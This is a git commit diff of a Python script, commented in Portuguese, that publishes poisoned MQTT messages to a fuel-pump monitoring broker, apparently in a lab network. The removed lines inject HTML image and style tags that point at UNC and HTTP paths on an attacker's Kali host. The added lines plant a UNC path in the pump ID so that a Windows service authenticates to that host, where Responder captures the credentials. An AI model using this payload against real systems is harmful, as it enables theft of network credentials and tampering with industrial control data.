6f0b67545d54b1a81e571437f8b1f819ae4dc095
Alef Santos <167534821+alefkaue@users.noreply.github.com>
2026-06-07 02:49:02 -0300

    Update injetar_av.py

--- injetar_av.py
+++ injetar_av.py
@@ -1,6 +1,5 @@
 import json
 import paho.mqtt.client as mqtt
-import time
 
 BROKER = "10.10.100.100"
 KALI_IP = "10.10.100.8"
@@ -8,19 +7,15 @@ KALI_IP = "10.10.100.8"
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
-# Injetando tags HTML simulando imagens ou links de recursos no seu Kali
-# Se o navegador da vítima (.3 ou .2) interpretar isso na tela, ele disparará a autenticação HTTP/SMB automática
+# Envenenando o ID da bomba diretamente com o caminho de rede UNC
+# Quando o bot ler a ordem pendente para processar, o Windows dele tentará acessar seu Kali
 payload = {
-    "pumpId": "PUMP001",
-    "location": f"<img src='\\\\{KALI_IP}\\share\\logo.png'>Terminal Leste",
-    "fuelType": f"<img src='http://{KALI_IP}/image.gif'>Diesel S-10",
-    "capacityCurrent": 4500,
-    "capacityTotal": 5000,
-    "capacityPercentage": "90.0",
-    "status": f"<b style='background-image:url(\\\\{KALI_IP}\\\\test)'>Normal</b>",
-    "timestamp": int(time.time() * 1000)
+    "pumpId": rf"\\{KALI_IP}\share\PUMP003",
+    "currentLevel": 5
 }
 
-client.publish("fuel-pumps/data", json.dumps(payload))
-print("[+] Payload HTML envenenado enviado. Monitore o Responder!")
+TOPICO = "fuel-pumps/refill-request"
+
+client.publish(TOPICO, json.dumps(payload))
+print("[+] Ordem de serviço envenenada enviada para o painel!")
 client.disconnect()
